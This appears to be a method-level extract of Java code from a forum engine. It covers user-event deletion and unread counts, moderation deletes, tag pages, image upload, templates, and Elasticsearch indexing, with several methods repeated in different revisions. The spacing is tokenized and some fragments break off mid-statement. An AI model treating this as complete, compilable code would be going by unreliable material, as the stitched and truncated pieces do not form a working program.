public void testRecalc ( ) { createSimpleEvent ( ) ; assertEquals ( 1 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; userEventDao . deleteTopicEvents ( TEST_TOPIC_ID , ImmutableSet . of ( UserEventFilterEnum . TAG . getType ( ) ) ) ; assertEquals ( 1 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; userEventDao . recalcEventCount ( ImmutableList . of ( TEST_USER_ID ) ) ; assertEquals ( 0 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; } 
public UserEventDao userEventDao ( ) { return new UserEventDao ( ) ; } 
public IgnoreListDao ignoreListDao ( ) { return Mockito . mock ( IgnoreListDao . class ) ; } 
public UserLogDao userLogDao ( ) { return Mockito . mock ( UserLogDao . class ) ; } 
public List < Integer > deleteWithReplys ( Topic topic , Comment comment , String reason , User user , int scoreBonus ) { CommentList commentList = getCommentList ( topic , false ) ; CommentNode node = commentList . getNode ( comment . getId ( ) ) ; List < CommentAndDepth > replys = getAllReplys ( node , 0 ) ; List < Integer > deleted = deleteReplys ( comment , reason , replys , user , - scoreBonus ) ; userEventService . processCommentsDeleted ( deleted ) ; return deleted ; } 
public void deleteCommentEvents ( Collection < Integer > comments ) { if ( comments . isEmpty ( ) ) { return ; } namedJdbcTemplate . update ( " DELETE FROM user_events WHERE comment_id IN (:list) AND type in ('REPLY', 'WATCH', 'REF') " , 
public void processCommentsDeleted ( List < Integer > msgids ) { userEventDao . deleteCommentEvents ( msgids ) ; } 
public boolean preHandle ( HttpServletRequest request , HttpServletResponse response , Object handler ) throws Exception { if ( handler instanceof ResourceHttpRequestHandler | | handler instanceof DefaultServletHttpRequestHandler ) { return true ; } String name ; if ( handler instanceof HandlerMethod ) { name = ( ( HandlerMethod ) handler ) . getBeanType ( ) . getSimpleName ( ) ; } else { name = handler . getClass ( ) . getSimpleName ( ) ; } Slf4JStopWatch watch = new Slf4JStopWatch ( name ) ; watch . setTimeThreshold ( TIME_THRESHOLD ) ; request . setAttribute ( ATTRIBUTE , watch ) ; return true ; } 
private HttpEntity < LoginStatus > entity ( LoginStatus status ) { HttpHeaders headers = new HttpHeaders ( ) ; headers . add ( " Access-Control-Allow-Origin " , siteConfig . getMainUrlWithoutSlash ( ) ) ; headers . add ( " Access-Control-Allow-Credentials " , " true " ) ; return new HttpEntity < > ( status , headers ) ; } 
public List < PreparedGalleryItem > prepare ( List < GalleryItem > items ) { String htmlPath = siteConfig . getHTMLPathPrefix ( ) ; ImmutableList . Builder < PreparedGalleryItem > builder = ImmutableList . builder ( ) ; for ( GalleryItem item : items ) { try { ImageInfo iconInfo = new ImageInfo ( htmlPath + item . getImage ( ) . getIcon ( ) ) ; ImageInfo fullInfo = new ImageInfo ( htmlPath + item . getImage ( ) . getOriginal ( ) ) ; builder . add ( new PreparedGalleryItem ( item , userDao . getUserCached ( item . getUserid ( ) ) , iconInfo , fullInfo ) ) ; } catch ( FileNotFoundException e ) { logger . error ( " Image not found! id={}: {} " , item . getImage ( ) . getId ( ) , e . getMessage ( ) ) ; } catch ( BadImageException | IOException e ) { logger . error ( " Bad image id={} " , item . getImage ( ) . getId ( ) , e ) ; } } return builder . build ( ) ; } 
public SpringTemplateLoader templateLoader ( ) { SpringTemplateLoader templateLoader = new SpringTemplateLoader ( ) ; templateLoader . setBasePath ( " template/ " ) ; return templateLoader ; } 
public JadeConfiguration jadeConfiguration ( SpringTemplateLoader loader ) { JadeConfiguration cfg = new JadeConfiguration ( ) ; cfg . setPrettyPrint ( false ) ; cfg . setCaching ( true ) ; cfg . setTemplateLoader ( loader ) ; return cfg ; } 
public JadeTemplate templateSign ( JadeConfiguration cfg ) throws IOException { return cfg . getTemplate ( " sign " ) ; } 
public JadeTemplate templateComment ( JadeConfiguration cfg ) throws IOException { return cfg . getTemplate ( " comment " ) ; } 
private String processUploadImage ( HttpServletRequest request ) throws IOException , ScriptErrorException { if ( request instanceof MultipartHttpServletRequest ) { MultipartFile multipartFile = ( ( MultipartRequest ) request ) . getFile ( " image " ) ; if ( multipartFile ! = null & & ! multipartFile . isEmpty ( ) ) { File uploadedFile = File . createTempFile ( " preview " , " " , new File ( siteConfig . getPathPrefix ( ) + " /linux-storage/tmp/ " ) ) ; String image = uploadedFile . getPath ( ) ; if ( ( uploadedFile . canWrite ( ) | | uploadedFile . createNewFile ( ) ) ) { try { logger . debug ( " Transfering upload to: " + image ) ; multipartFile . transferTo ( uploadedFile ) ; return image ; } catch ( Exception e ) { throw new ScriptErrorException ( " Failed to write uploaded file " , e ) ; } } else { logger . info ( " Bad target file name: " + image ) ; } } } return null ; } 
private PreparedImage prepareImage ( @Nonnull Image image , boolean secure ) { Preconditions . checkNotNull ( image ) ; String mediumName = image . getMedium ( ) ; String htmlPath = siteConfig . getHTMLPathPrefix ( ) ; if ( ! new File ( htmlPath , mediumName ) . exists ( ) ) { mediumName = image . getIcon ( ) ; } try { ImageInfo mediumImageInfo = new ImageInfo ( htmlPath + mediumName ) ; 
public ModelAndView activate ( HttpServletRequest request , @RequestParam String activation ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized! " ) ; } User user = tmpl . getCurrentUser ( ) ; String newEmail = userDao . getNewEmail ( user ) ; if ( newEmail = = null ) { throw new AccessViolationException ( " new_email == null?! " ) ; } String regcode = user . getActivationCode ( siteConfig . getSecret ( ) , newEmail ) ; if ( ! regcode . equals ( activation ) ) { throw new AccessViolationException ( " Bad activation code " ) ; } userDao . acceptNewEmail ( user , newEmail ) ; return new ModelAndView ( new RedirectView ( " /people/ " + user . getNick ( ) + " /profile " ) ) ; } 
private RootNode prepareTopicRootNode ( boolean minimizeCut , String cutURL , boolean secure , boolean nofollow ) { RootNode rootNode = defaultParser . getRootNode ( ) ; if ( minimizeCut ) { try { LorURL lorCutURL = new LorURL ( siteConfig . getMainURI ( ) , cutURL ) ; if ( lorCutURL . isTrueLorUrl ( ) ) { URI fixURI = new URI ( lorCutURL . fixScheme ( secure ) , true , " UTF-8 " ) ; rootNode . setMinimizedTopicCutOptions ( fixURI ) ; } else { rootNode . setMaximizedTopicCutOptions ( ) ; } } catch ( Exception e ) { rootNode . setMaximizedTopicCutOptions ( ) ; } } else { rootNode . setMaximizedTopicCutOptions ( ) ; } rootNode . setUserDao ( userDao ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( toHtmlFormatter ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
public String memberURL ( User user , boolean secure ) throws URIException { URI mainUri = siteConfig . getMainURI ( ) ; String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } return ( new URI ( scheme , null , mainUri . getHost ( ) , mainUri . getPort ( ) , String . format ( " /people/%s/profile " , user . getNick ( ) ) ) ) . getEscapedURIReference ( ) ; } 
public void processUrl ( boolean secure , boolean nofollow , @Nonnull StringBuilder out , @Nonnull String urlHref , @Nullable String linktext ) throws URIException { LorURL url = new LorURL ( siteConfig . getMainURI ( ) , urlHref ) ; if ( url . isMessageUrl ( ) ) { processMessageUrl ( secure , out , url , linktext ) ; 
public void init ( ) throws Exception { maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . thenReturn ( false ) ; when ( JB . isBlocked ( ) ) . thenReturn ( false ) ; when ( isden . isBlocked ( ) ) . thenReturn ( true ) ; when ( maxcom . getNick ( ) ) . thenReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . thenReturn ( " JB " ) ; when ( isden . getNick ( ) ) . thenReturn ( " isden " ) ; userDao = mock ( UserDao . class ) ; when ( userDao . getUser ( " maxcom " ) ) . thenReturn ( maxcom ) ; when ( userDao . getUser ( " JB " ) ) . thenReturn ( JB ) ; when ( userDao . getUser ( " isden " ) ) . thenReturn ( isden ) ; when ( userDao . getUser ( " hizel " ) ) . thenThrow ( new UserNotFoundException ( " hizel " ) ) ; mainUrl = " http:127.0.0.1:8080/ " ; mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( userDao ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void initTest ( ) throws Exception { userDao = mock ( UserDao . class ) ; user = mock ( User . class ) ; when ( user . isBlocked ( ) ) . thenReturn ( false ) ; when ( user . getNick ( ) ) . thenReturn ( " splinter " ) ; when ( userDao . getUser ( " splinter " ) ) . thenReturn ( user ) ; mainUrl = " http:127.0.0.1:8080/ " ; mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( userDao ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; } 
private boolean deleteTopic ( int mid , User moderator , String reason , int bonus ) { boolean deleted = topicDao . delete ( mid ) ; if ( deleted ) { deleteInfoDao . insert ( mid , moderator , reason , bonus ) ; userEventService . processTopicDeleted ( ImmutableList . of ( mid ) ) ; } return deleted ; } 
public List < Integer > deleteByIPAddress ( String ip , Timestamp startTime , User moderator , String reason ) { List < Integer > topicIds = topicDao . getAllByIPForUpdate ( ip , startTime ) ; return massDelete ( moderator , topicIds , reason ) ; } 
private List < Integer > massDelete ( User moderator , Iterable < Integer > topics , String reason ) { List < Integer > deletedTopics = new ArrayList < > ( ) ; for ( int mid : topics ) { boolean deleted = topicDao . delete ( mid ) ; if ( deleted ) { deleteInfoDao . insert ( mid , moderator , reason , 0 ) ; deletedTopics . add ( mid ) ; } } userEventService . processTopicDeleted ( deletedTopics ) ; return deletedTopics ; } 
public void deleteTopicEvents ( Collection < Integer > topics ) { if ( topics . isEmpty ( ) ) { return ; } namedJdbcTemplate . update ( " DELETE FROM user_events WHERE message_id IN (:list) AND type IN ('TAG', 'REF', 'REPLY', 'WATCH') " , 
public void processTopicDeleted ( Collection < Integer > msgids ) { userEventDao . deleteTopicEvents ( msgids ) ; } 
public void testAddRemove ( ) { createSimpleEvent ( ) ; List < UserEvent > events = userEventDao . getRepliesForUser ( TEST_USER_ID , true , 50 , 0 , null ) ; assertEquals ( 1 , events . size ( ) ) ; userEventDao . deleteTopicEvents ( ImmutableList . of ( TEST_TOPIC_ID ) ) ; List < UserEvent > eventsAfterDelete = userEventDao . getRepliesForUser ( TEST_USER_ID , true , 50 , 0 , null ) ; assertEquals ( 0 , eventsAfterDelete . size ( ) ) ; } 
public void testRemoveSyntax ( ) { userEventDao . deleteTopicEvents ( ImmutableList . of ( TEST_TOPIC_ID ) ) ; } 
public void testRecalc ( ) { createSimpleEvent ( ) ; assertEquals ( 1 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; userEventDao . deleteTopicEvents ( ImmutableList . of ( TEST_TOPIC_ID ) ) ; assertEquals ( 1 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; userEventDao . recalcEventCount ( ImmutableList . of ( TEST_USER_ID ) ) ; assertEquals ( 0 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; } 
public List < Integer > deleteTopicEvents ( Collection < Integer > topics ) { if ( topics . isEmpty ( ) ) { return ImmutableList . of ( ) ; } List < Integer > affectedUsers = namedJdbcTemplate . queryForList ( " SELECT DISTINCT (userid) FROM user_events " + " WHERE message_id IN (:list) AND type IN ('TAG', 'REF', 'REPLY', 'WATCH') " , ImmutableMap . of ( " list " , topics ) , Integer . class ) ; namedJdbcTemplate . update ( " DELETE FROM user_events WHERE message_id IN (:list) AND type IN ('TAG', 'REF', 'REPLY', 'WATCH') " , ImmutableMap . of ( " list " , topics ) ) ; return affectedUsers ; } 
public List < Integer > deleteCommentEvents ( Collection < Integer > comments ) { if ( comments . isEmpty ( ) ) { return ImmutableList . of ( ) ; } List < Integer > affectedUsers = namedJdbcTemplate . queryForList ( " SELECT DISTINCT (userid) FROM user_events " + " WHERE comment_id IN (:list) AND type in ('REPLY', 'WATCH', 'REF') " , ImmutableMap . of ( " list " , comments ) , Integer . class ) ; namedJdbcTemplate . update ( " DELETE FROM user_events WHERE comment_id IN (:list) AND type in ('REPLY', 'WATCH', 'REF') " , ImmutableMap . of ( " list " , comments ) ) ; return affectedUsers ; } 
public void processTopicDeleted ( Collection < Integer > msgids ) { userEventDao . recalcEventCount ( userEventDao . deleteTopicEvents ( msgids ) ) ; } 
public void processCommentsDeleted ( List < Integer > msgids ) { userEventDao . recalcEventCount ( userEventDao . deleteCommentEvents ( msgids ) ) ; } 
public void testRecalc ( ) { createSimpleEvent ( ) ; assertEquals ( 1 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; List < Integer > affected = userEventDao . deleteTopicEvents ( ImmutableList . of ( TEST_TOPIC_ID ) ) ; assertEquals ( 1 , affected . size ( ) ) ; assertEquals ( 1 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; userEventDao . recalcEventCount ( ImmutableList . of ( TEST_USER_ID ) ) ; assertEquals ( 0 , userDao . getUser ( TEST_USER_ID ) . getUnreadEvents ( ) ) ; } 
public List < String > relatedTags ( int tagid ) { return jdbcTemplate . queryForList ( " select value from " + 
public ModelAndView tagPage ( HttpServletRequest request , @PathVariable String tag ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; tagService . checkTag ( tag ) ; ModelAndView mv = new ModelAndView ( " tag-page " ) ; mv . addObject ( " tag " , tag ) ; mv . addObject ( " title " , WordUtils . capitalize ( tag ) ) ; mv . addObject ( " counter " , tagService . getCounter ( tag ) ) ; if ( tmpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; } int tagId = tagService . getTagId ( tag ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( tagId ) ) ; List < String > relatedTags = tagService . getRelatedTags ( tagId ) ; if ( relatedTags . size ( ) > 1 ) { mv . addObject ( " relatedTags " , relatedTags ) ; } mv . addAllObjects ( getNewsSection ( request , tag ) ) ; mv . addAllObjects ( getGallerySection ( tag , tagId , tmpl ) ) ; mv . addAllObjects ( getForumSection ( tag , tagId ) ) ; return mv ; } 
public void testRelatedTags ( ) { List < String > tags = tagDao . relatedTags ( 30 ) ; assertNotNull ( tags ) ; } 
public void deleteTest ( ) throws Exception { when ( tagDao . getTagId ( " InvalidTestTag " ) ) . thenThrow ( new TagNotFoundException ( " TagNotFoundException " ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " InvalidTestTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " testTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " testTag " , " testTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; tagService . delete ( " testTag " , " testNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
private boolean checkMemoriesPresent ( User user , boolean watch ) { List < Integer > present = jdbcTemplate . queryForList ( " select memories.id from memories join topics on memories.topic=topics.id where memories.userid=? and watch=? and not deleted limit 1; " , Integer . class , user . getId ( ) , watch ) ; return ! present . isEmpty ( ) ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId , HttpServletRequest request ) { Template tmpl = Template . getTemplate ( request ) ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; Section section = null ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; modelAndView . addObject ( " section " , section ) ; modelAndView . addObject ( " addlink " , AddTopicController . getAddUrl ( section ) ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 1 ) ; List < Topic > messages = topicListService . getAllTopicsFeed ( section , calendar . getTime ( ) ) ; modelAndView . addObject ( " messages " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false ) ) ; List < TopicListDto . DeletedTopic > deleted = topicListService . getDeletedTopicsFeed ( sectionId ) ; modelAndView . addObject ( " deletedTopics " , deleted ) ; modelAndView . addObject ( " sections " , sectionService . getSectionList ( ) ) ; return modelAndView ; } 
public MappingJackson2HttpMessageConverter jsonConverter ( ) { MappingJackson2HttpMessageConverter converter = new MappingJackson2HttpMessageConverter ( ) ; converter . setPrettyPrint ( true ) ; converter . getObjectMapper ( ) . configure ( SerializationFeature . WRITE_DATES_AS_TIMESTAMPS , false ) ; return converter ; } 
private void prepareTopicsForPlainOrRss ( HttpServletRequest request , ModelAndView modelAndView , boolean rss , List < Topic > messages ) { if ( rss ) { modelAndView . addObject ( 
public void editCommentTest ( ) { int commentId = jdbcTemplate . queryForObject ( " select nextval('s_msgid') " , Integer . class ) ; addComment ( commentId , null , " CommentDaoIntegrationTest.editCommentTest() " , " CommentDaoIntegrationTest.editCommentTest(): comment body " ) ; Comment oldComment = mock ( Comment . class ) ; when ( oldComment . getId ( ) ) . thenReturn ( commentId ) ; Comment newComment = mock ( Comment . class ) ; when ( newComment . getTitle ( ) ) . thenReturn ( " CommentDaoIntegrationTest.editCommentTest(): new title " ) ; commentDao . edit ( oldComment , newComment , " test body " ) ; List < Map < String , Object > > rows = getComment ( commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; Map < String , Object > row = rows . get ( 0 ) ; assertEquals ( " CommentDaoIntegrationTest.editCommentTest(): new title " , row . get ( " title " ) ) ; rows = jdbcTemplate . queryForList ( " SELECT * FROM msgbase WHERE id=? " , commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; row = rows . get ( 0 ) ; assertEquals ( " test body " , row . get ( " message " ) ) ; } 
public void updateLatestEditorInfoTest ( ) { int commentId = jdbcTemplate . queryForObject ( " select nextval('s_msgid') " , Integer . class ) ; addComment ( commentId , null , " CommentDaoIntegrationTest.updateLatestEditorInfoTest() " , " comment body " ) ; List < Map < String , Object > > rows = getComment ( commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; Map < String , Object > row = rows . get ( 0 ) ; assertNull ( row . get ( " edit_nick " ) ) ; assertNull ( row . get ( " edit_date " ) ) ; assertEquals ( 0 , row . get ( " edit_count " ) ) ; Date commentEditDate = new Date ( ) ; commentDao . updateLatestEditorInfo ( commentId , 1 , commentEditDate , 1234 ) ; rows = getComment ( commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; row = rows . get ( 0 ) ; Timestamp rowTimestamp = ( Timestamp ) row . get ( " edit_date " ) ; assertEquals ( " maxcom " , row . get ( " edit_nick " ) ) ; assertEquals ( rowTimestamp . getTime ( ) , commentEditDate . getTime ( ) ) ; assertEquals ( 1234 , row . get ( " edit_count " ) ) ; } 
public void isHaveAnswersTest ( ) { int commentId1 = jdbcTemplate . queryForObject ( " select nextval('s_msgid') " , Integer . class ) ; int commentId2 = jdbcTemplate . queryForObject ( " select nextval('s_msgid') " , Integer . class ) ; addComment ( commentId1 , null , " CommentDaoIntegrationTest.isHaveAnswersTest() - 1 " , " comment body " ) ; assertEquals ( 0 , commentDao . getReplaysCount ( commentId1 ) ) ; addComment ( commentId2 , commentId1 , " CommentDaoIntegrationTest.isHaveAnswersTest() - 2 " , " comment body " ) ; assertTrue ( commentDao . getReplaysCount ( commentId1 ) > 0 ) ; } 
private int createUser ( String userName ) { int userid = jdbcTemplate . queryForObject ( " SELECT nextval('s_uid') AS userid " , Integer . class ) ; jdbcTemplate . update ( " INSERT INTO users (id, name, nick) VALUES (?, ?, ?) " , userid , userName , userName ) ; return userid ; } 
public void addTest ( ) { prepareUserTags ( ) ; userTagDao . addTag ( user1Id , tag1Id , false ) ; int result ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_IGNORE_BY_USER , Integer . class , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_FAVORITE_BY_USER , Integer . class , user2Id ) ; assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_IGNORE_BY_USER , Integer . class , user2Id ) ; assertEquals ( " Wrong count of user tags. " , 0 , result ) ; result = jdbcTemplate . queryForObject ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , Integer . class , tag1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void replaceTagTest ( ) { int result ; prepareUserTags ( ) ; userTagDao . replaceTag ( tag2Id , tag1Id ) ; result = jdbcTemplate . queryForObject ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , Integer . class , tag1Id ) ; assertEquals ( " Wrong count of user tags. " , 2 , result ) ; userTagDao . deleteTags ( tag1Id ) ; userTagDao . replaceTag ( tag2Id , tag1Id ) ; result = jdbcTemplate . queryForObject ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , Integer . class , tag1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void makeTitle ( ) { given when String actualResult = StringUtil.makeTitle("\"Test of \"quotes '' \"in quotes\" in title\"\""); then assertEquals("&#171;Test of &#8222;quotes &quot; &#8222;in quotes&#8220; in title&#8220;&#187;", actualResult); } 
public ImmutableList < CommentNode > childs ( ) { return childs ; } 
public void addChild ( CommentNodeBuilder child ) { childs . add ( child ) ; } 
public CommentNode build ( ) { return new CommentNode ( comment , Lists . transform ( childs , new Function < CommentNodeBuilder , CommentNode > ( ) { 
public CommentNode apply ( CommentNodeBuilder input ) { return input . build ( ) ; } 
public Client elastic ( ) { return new TransportClient ( ) . addTransportAddress ( new InetSocketTransportAddress ( " 127.0.0.1 " , 9300 ) ) ; 
public void handleMessage ( UpdateMessage msgUpdate ) throws MessageNotFoundException , IOException , SolrServerException { logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; reindexMessage ( msgUpdate . getMsgid ( ) , msgUpdate . isWithComments ( ) ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) throws IOException , SolrServerException , MessageNotFoundException { Topic msg = topicDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) & & ! msg . isDraft ( ) ) { updateMessage ( msg ) ; } else { client . prepareDelete ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( msg . getId ( ) ) ) . execute ( ) . actionGet ( ) ; logger.info("Deleting message "+msgid+" from solr"); } if (withComments) { CommentList commentList = commentService.getCommentList(msg, true); 
private void executeBulk ( BulkRequestBuilder bulkRequest ) { if ( bulkRequest . numberOfActions ( ) > 0 ) { BulkResponse bulkResponse = bulkRequest . execute ( ) . actionGet ( ) ; 
public void handleMessage ( UpdateMonth msgUpdate ) throws MessageNotFoundException , IOException , SolrServerException { int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > topicIds = topicDao . getMessageForMonth ( year , month ) ; for ( int topicId : topicIds ) { reindexMessage ( topicId , true ) ; } long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
private void updateMessage ( Topic topic ) throws IOException , SolrServerException { Map < String , Object > doc = new HashMap < > ( ) ; doc . put ( " id " , topic . getId ( ) ) ; doc . put ( " section_id " , topic . getSectionId ( ) ) ; doc . put ( " section " , topic . getSectionId ( ) ) ; doc . put ( " user_id " , topic . getUid ( ) ) ; doc . put ( " topic_user_id " , topic . getUid ( ) ) ; doc . put ( " topic_id " , topic . getId ( ) ) ; doc . put ( " group_id " , topic . getGroupId ( ) ) ; doc . put ( " title " , StringEscapeUtils . unescapeHtml ( topic . getTitle ( ) ) ) ; doc . put ( " topic_title " , topic . getTitle ( ) ) ; doc . put ( " message " , msgbaseDao . getMessageText ( topic . getId ( ) ) . getText ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( topic . getId ( ) ) ) 
private IndexRequestBuilder processComment ( Topic topic , Comment comment , String message ) { Map < String , Object > doc = new HashMap < > ( ) ; doc . put ( " section_id " , topic . getSectionId ( ) ) ; doc . put ( " section " , topic . getSectionId ( ) ) ; doc . put ( " user_id " , comment . getUserid ( ) ) ; doc . put ( " topic_user_id " , topic . getUid ( ) ) ; doc . put ( " topic_id " , comment . getTopicId ( ) ) ; doc . put ( " group_id " , topic . getGroupId ( ) ) ; String topicTitle = topic . getTitle ( ) ; doc . put ( " topic_title " , StringEscapeUtils . unescapeHtml ( topicTitle ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( topicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . put ( " title " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . put ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " is_comment " , true ) ; return client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( comment . getId ( ) ) ) 
public void handleMessage ( UpdateMessage msgUpdate ) throws MessageNotFoundException , IOException { logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; reindexMessage ( msgUpdate . getMsgid ( ) , msgUpdate . isWithComments ( ) ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) throws IOException , MessageNotFoundException { Topic msg = topicDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) & & ! msg . isDraft ( ) ) { updateMessage ( msg ) ; } else { client . prepareDelete ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( msg . getId ( ) ) ) . execute ( ) . actionGet ( ) ; logger.info("Deleting message "+msgid+" from solr"); } if (withComments) { CommentList commentList = commentService.getCommentList(msg, true); 
public void handleMessage ( UpdateMonth msgUpdate ) throws MessageNotFoundException , IOException { int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > topicIds = topicDao . getMessageForMonth ( year , month ) ; for ( int topicId : topicIds ) { reindexMessage ( topicId , true ) ; } long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
private void updateMessage ( Topic topic ) throws IOException { Map < String , Object > doc = new HashMap < > ( ) ; doc . put ( " id " , topic . getId ( ) ) ; doc . put ( " section_id " , topic . getSectionId ( ) ) ; doc . put ( " section " , topic . getSectionId ( ) ) ; doc . put ( " user_id " , topic . getUid ( ) ) ; doc . put ( " topic_user_id " , topic . getUid ( ) ) ; doc . put ( " topic_id " , topic . getId ( ) ) ; doc . put ( " group_id " , topic . getGroupId ( ) ) ; doc . put ( " title " , StringEscapeUtils . unescapeHtml ( topic . getTitle ( ) ) ) ; doc . put ( " topic_title " , topic . getTitle ( ) ) ; doc . put ( " message " , msgbaseDao . getMessageText ( topic . getId ( ) ) . getText ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( topic . getId ( ) ) ) 
public Group getGroup ( Section section , String name ) throws GroupNotFoundException { Group group = getGroupOrNull ( section , name ) ; if ( group = = null ) { logger . info ( " Group '{}' not found in section {} " , name , section . getUrlName ( ) ) ; throw new GroupNotFoundException ( " group not found " ) ; } return group ; } 
public void handleMessage ( UpdateMessage msgUpdate ) throws MessageNotFoundException , IOException { if ( ! mappingsSet ) { updateMapping ( ) ; } logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; reindexMessage ( msgUpdate . getMsgid ( ) , msgUpdate . isWithComments ( ) ) ; } 
